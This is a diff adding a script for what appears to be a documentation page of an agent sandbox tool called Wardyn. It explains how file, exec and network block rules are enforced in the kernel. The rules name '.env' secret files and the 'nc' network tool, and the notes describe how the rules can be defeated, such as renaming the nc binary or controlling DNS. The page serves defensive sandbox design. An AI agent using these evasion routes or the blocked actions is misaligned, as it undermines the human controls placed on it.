+      verdict: "<b>exact, and anchored.</b> Survives <code>mv</code>, <code>ln</code>, and a renamed parent directory.", note: "Resolved at startup with <code>stat()</code> from the <em>agent's</em> home, not root's. If the file does not exist yet the rule pins nothing, and startup says <em>resolved to nothing</em> rather than anchoring the wrong object. <code>access: all</code> sets every axis bit: read, write, create, delete." },
+    { ax: "file", rule: '{ match: "**/.env.*", action: block }', key: "—", map: "none", how: "cannot be reduced: the last segment contains a glob", cls: "none",
+      verdict: "<b>not kernel-enforceable.</b> Flagged in the feed as <code>block~</code>, never denied.", note: "Only basename, directory and pair keys exist in the kernel. Startup: <em>policy `**/.env.*` (block) can't be kernel-enforced (only basename/dir file rules and CIDRs are) — it will be flagged, not denied.</em> Write the names out: <code>.env.local</code>, <code>.env.production</code>." },
+    { ax: "exec", rule: '{ match: "**/nc", action: block }', key: "exec name=nc", map: "BLOCK_EXEC  (hash)", how: "the basename of bprm->file at bprm_check_security", cls: "exact",
+      verdict: "<b>exact.</b> Any program named <code>nc</code>, wherever it lives.", note: "Copy <code>nc</code> to <code>./helper</code> and the name rule is defeated — which is what <code>path:</code> on an exec rule is for. Pinned by inode, the binary is denied under any name." },
+    { ax: "net", rule: '{ cidr: "10.0.0.0/8", action: block }', key: "LPM prefix 8 · 0a000000", map: "NET_RULES4  (LPM trie, address tier)", how: "longest-prefix match on the destination address", cls: "exact",
+      verdict: "<b>exact.</b> Address rules are the fourth tier; more specific tiers are consulted first.", note: "Octets are stored in network order with <code>from_ne_bytes</code> — <code>from_le_bytes</code> only happened to work on little-endian hosts. IPv6 has its own trie; a v4-mapped <code>::ffff:</code> destination is unwrapped by <code>connect6</code> and looked up here." },
+    { ax: "net", rule: '{ port: 22, proto: tcp, action: block }', key: "proto+port · (6, 22)", map: "NET_RULES · tier 1 of 4", how: "protocol and port together — the most specific tier", cls: "exact",
+      verdict: "<b>exact, and first.</b> Beats a bare port rule, which beats a bare protocol rule, which beats an address rule.", note: "The key leads with the field a prefix should pin. Ordering is what lets <code>{ port: 53, proto: udp, allow }</code> live inside a <code>0.0.0.0/0 block</code> — the resolver works, everything else is denied." },
+    { ax: "net", rule: '{ domain: "api.anthropic.com", action: allow }', key: "LPM /32 × N resolved addresses", map: "NET_RULES4/6 · refreshed every 60 s", how: "the system resolver's answer, re-asked once a minute", cls: "broad",
+      verdict: "<b>sound only as far as DNS is.</b> Wardyn says so at startup, and re-resolves so a moving CDN is followed within a minute.", note: "<em>A block by name is still defeated by anyone who controls the name. Use cidr: where it has to be sound.</em> A refresh that changes nothing costs nothing; one that fails leaves the previous answer in force and reports it." }
+  ];
+  var rulesEl = $("rules");
+  function pickRule(k) {
+    Array.prototype.forEach.call(rulesEl.children, function (b, n) { b.setAttribute("aria-pressed", String(n === k)); });
+    var r = RULES[k], panel = document.querySelector(".compiled");
+    panel.classList.remove("swap"); void panel.getBoundingClientRect(); panel.classList.add("swap");
+    setText("r-rule", r.rule); setText("r-key", r.key); setText("r-map", r.map); setText("r-how", r.how);
+    $("r-verdict").className = "verdict-line " + r.cls; $("r-verdict").innerHTML = r.verdict;
+    $("r-note").innerHTML = r.note;
+  }
+  RULES.forEach(function (r, k) {
+    var b = document.createElement("button");
+    b.setAttribute("aria-pressed", "false");
+    b.innerHTML = '<span class="ax">' + r.ax + '</span><span></span>';
+    b.lastChild.textContent = r.rule;
+    b.addEventListener("click", function () { pickRule(k); });
+    rulesEl.appendChild(b);
+  });
+  pickRule(0);
+})();
+</script>
